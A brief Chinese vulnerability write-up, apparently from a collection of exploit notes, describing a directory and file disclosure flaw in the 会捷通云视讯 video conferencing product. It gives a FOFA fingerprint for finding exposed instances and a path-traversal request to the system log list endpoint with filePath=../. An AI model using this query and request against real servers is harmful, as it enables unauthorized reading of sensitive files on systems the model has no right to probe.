# 会捷通云视讯-list-目录文件泄露漏洞

## 漏洞描述

会捷通云视讯某个文件 list参数 存在目录文件泄露漏洞，攻击者通过漏洞可以获取一些敏感信息

## 漏洞影响

> [!NOTE]
>
> 会捷通云视讯

## FOFA

> [!NOTE]
>
> body="/him/api/rest/v1.0/node/role"

## 漏洞复现

登陆页面如下

![](会捷通云视讯-list-目录文件泄露漏洞.assets/16273631455192058.jpg)

访问Url

```
/him/api/rest/V1.0/system/log/list?filePath=../
```

![](会捷通云视讯-list-目录文件泄露漏洞.assets/1627363145848755.jpg)

## Goby & POC

![](会捷通云视讯-list-目录文件泄露漏洞.assets/16273631462054589.jpg)